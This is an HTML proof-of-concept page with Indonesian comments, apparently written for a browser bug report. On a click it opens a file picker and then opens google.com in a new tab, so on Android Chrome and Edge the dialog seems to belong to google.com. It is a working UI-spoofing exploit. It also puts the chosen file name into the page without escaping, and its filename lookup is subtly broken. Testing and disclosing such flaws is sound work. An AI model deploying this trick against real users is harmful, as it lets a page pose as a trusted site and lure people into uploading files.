<!DOCTYPE html>
<html lang="id">
    <head>
        <title>PoC Upload Dialog</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <style>
            body { font-family: sans-serif; cursor: pointer; height: 100vh; display: flex; align-items: center; justify-content: center; }
            #fileInput { display: none; }
        </style>
        <script>
            onclick = () => {
                // Memicu dialog pemilihan file
                document.getElementById('fileInput').click();
                
                // Segera membuka tab baru ke google.com
                // Di Android (Edge/Chrome), dialog file seringkali tetap menggantung 
                // di atas aplikasi meskipun tab di belakangnya sudah berubah.
                window.open("https://www.google.com", "PoC");

                // Logika tambahan untuk mendeteksi file yang dipilih (opsional)
                document.getElementById('fileInput').onchange = (e) => {
                    const fileName = e.target.files.name;
                    document.body.innerHTML = `<h1>File terdeteksi: <span style="color:red">${fileName}</span></h1>`;
                };
            }
        </script>
    </head>  
    <body>
        <input type="file" id="fileInput">
        <center>
            <h1>Klik di mana saja untuk memicu dialog File Upload di atas Google.com</h1>
            <p>(Uji coba khusus Edge/Chrome di Android)</p>
        </center>
    </body>
</html>
